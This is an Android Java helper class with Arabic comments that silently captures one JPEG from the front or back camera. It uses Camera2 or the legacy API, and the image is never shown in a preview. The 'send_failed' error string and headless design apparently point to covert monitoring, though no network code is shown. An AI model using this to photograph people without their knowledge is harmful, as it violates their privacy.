package com.sec.check;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

/**
 * CameraHelper - يدعم كاميرا Android لكل الإصدارات
 * - Android 5+ (API 21+) → Camera2 API
 * - أقدم → Camera API القديم
 */
public class CameraHelper {

    private static final String TAG = "CameraHelper";

    // ============================================================
    // Callback interface
    // ============================================================
    public interface PhotoCallback {
        void onSuccess(byte[] jpegData);
        void onError(String error);
    }

    // ============================================================
    // ★★★ الطريقة الرئيسية ★★★
    // ============================================================
    public static void capturePhoto(Context context, boolean isFront, PhotoCallback callback) {
        // فحص الصلاحيات
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            callback.onError("no_camera_permission");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            capturePhotoCamera2(context, isFront, callback);
        } else {
            capturePhotoLegacy(context, isFront, callback);
        }
    }

    // ============================================================
    // ★★★ Camera2 API (Android 5+) ★★★
    // ============================================================
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private static void capturePhotoCamera2(Context context, boolean isFront, PhotoCallback callback) {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);

            if (manager == null) {
                callback.onError("no_camera_manager");
                return;
            }

            // ابحث عن الكاميرا المطلوبة
            String targetCameraId = null;
            String[] cameraIds = manager.getCameraIdList();

            Log.d(TAG, "Available cameras: " + Arrays.toString(cameraIds));

            for (String cameraId : cameraIds) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);

                if (facing != null) {
                    // LENS_FACING_FRONT = 0, LENS_FACING_BACK = 1
                    if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        targetCameraId = cameraId;
                        break;
                    }
                    if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        targetCameraId = cameraId;
                        break;
                    }
                }
            }

            // fallback: لو ملقاش الكاميرا المطلوبة، استخدم أي واحدة
            if (targetCameraId == null && cameraIds.length > 0) {
                targetCameraId = cameraIds[0];
                Log.w(TAG, "Target camera not found, using: " + targetCameraId);
            }

            if (targetCameraId == null) {
                callback.onError("no_camera_available");
                return;
            }

            final String finalCameraId = targetCameraId;
            final CameraManager finalManager = manager;

            // Handler Thread للكاميرا
            HandlerThread thread = new HandlerThread("CameraBackground");
            thread.start();
            Handler handler = new Handler(thread.getLooper());

            // افتح الكاميرا
            final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    Log.d(TAG, "Camera opened: " + finalCameraId);
                    try {
                        // أنشئ capture session
                        final ImageReader reader = ImageReader.newInstance(
                                1920, 1080, ImageFormat.JPEG, 1);

                        reader.setOnImageAvailableListener(imageReader -> {
                            try {
                                Image image = imageReader.acquireLatestImage();
                                if (image == null) {
                                    callback.onError("no_image");
                                    return;
                                }

                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes);
                                image.close();

                                Log.d(TAG, "Photo captured: " + bytes.length + " bytes");
                                callback.onSuccess(bytes);

                                // إغلاق
                                try {
                                    camera.close();
                                    imageReader.close();
                                    thread.quitSafely();
                                } catch (Exception e) {}

                            } catch (Exception e) {
                                Log.e(TAG, "imageReader error: " + e.getMessage());
                                callback.onError("read_failed: " + e.getMessage());
                            }
                        }, handler);

                        camera.createCaptureSession(
                                Arrays.asList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        try {
                                            CaptureRequest.Builder builder = camera.createCaptureRequest(
                                                    CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            builder.addTarget(reader.getSurface());
                                            builder.set(CaptureRequest.CONTROL_MODE,
                                                    CaptureRequest.CONTROL_MODE_AUTO);
                                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);

                                            session.capture(builder.build(), null, handler);
                                            Log.d(TAG, "Capture request sent");

                                        } catch (Exception e) {
                                            Log.e(TAG, "capture error: " + e.getMessage());
                                            callback.onError("capture_failed: " + e.getMessage());
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                        callback.onError("session_config_failed");
                                    }
                                },
                                handler
                        );

                    } catch (Exception e) {
                        Log.e(TAG, "session error: " + e.getMessage());
                        callback.onError("session_error: " + e.getMessage());
                        try { camera.close(); } catch (Exception ex) {}
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    callback.onError("camera_disconnected");
                    try { camera.close(); } catch (Exception e) {}
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    callback.onError("camera_error_" + error);
                    try { camera.close(); } catch (Exception e) {}
                }
            };

            manager.openCamera(finalCameraId, stateCallback, handler);

        } catch (Exception e) {
            Log.e(TAG, "capturePhotoCamera2 error: " + e.getMessage());
            callback.onError("exception: " + e.getMessage());
        }
    }

    // ============================================================
    // ★★★ Legacy Camera API (Android 4.4 وأقل) ★★★
    // ============================================================
    private static void capturePhotoLegacy(Context context, boolean isFront, PhotoCallback callback) {
        new Thread(() -> {
            android.hardware.Camera camera = null;
            try {
                int cameraId = isFront ? 1 : 0;

                // ابحث عن الكاميرا الصحيحة
                int numCameras = android.hardware.Camera.getNumberOfCameras();
                for (int i = 0; i < numCameras; i++) {
                    android.hardware.Camera.CameraInfo info = new android.hardware.Camera.CameraInfo();
                    android.hardware.Camera.getCameraInfo(i, info);

                    if (isFront && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        cameraId = i;
                        break;
                    }
                    if (!isFront && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                        cameraId = i;
                        break;
                    }
                }

                camera = android.hardware.Camera.open(cameraId);
                if (camera == null) {
                    callback.onError("camera_null");
                    return;
                }

                android.hardware.Camera.Parameters params = camera.getParameters();
                params.setPictureFormat(ImageFormat.JPEG);
                params.setJpegQuality(85);
                camera.setParameters(params);

                camera.startPreview();

                Thread.sleep(1500);

                final android.hardware.Camera finalCamera = camera;
                camera.takePicture(null, null, (data, cam) -> {
                    try {
                        callback.onSuccess(data);
                        Log.d(TAG, "Legacy photo: " + data.length + " bytes");
                    } catch (Exception e) {
                        callback.onError("send_failed: " + e.getMessage());
                    } finally {
                        try { cam.release(); } catch (Exception ignored) {}
                    }
                });

            } catch (Exception e) {
                Log.e(TAG, "capturePhotoLegacy error: " + e.getMessage());
                callback.onError("exception: " + e.getMessage());
                if (camera != null) {
                    try { camera.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }
                          }
